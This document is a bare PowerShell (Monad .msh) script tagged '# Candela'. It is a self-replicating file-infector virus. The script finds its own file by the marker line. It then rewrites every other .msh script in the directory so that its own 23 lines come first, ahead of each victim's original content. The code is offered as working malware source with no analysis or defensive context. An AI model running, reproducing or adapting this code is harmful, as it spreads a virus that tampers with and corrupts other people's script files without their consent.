$name_array=get-childitem *.msh
# Candela
foreach ($name in $name_array)
{
  $cont=get-content $name.Name
  if ($cont[1] -eq "# Candela")
  {
    $my_name=$name.Name
  }
}

$vir_cont=get-content $my_name

foreach ($name in $name_array)
{
  $cont=get-content $name.Name
  if ($cont[1] -ne "# Candela")
  {
    echo $vir_cont[0] >$name.Name
    for ($i=1; $i -lt 23; $i++) { echo $vir_cont[$i] >>$name.Name }
    echo $cont >>$name.Name
  }
}
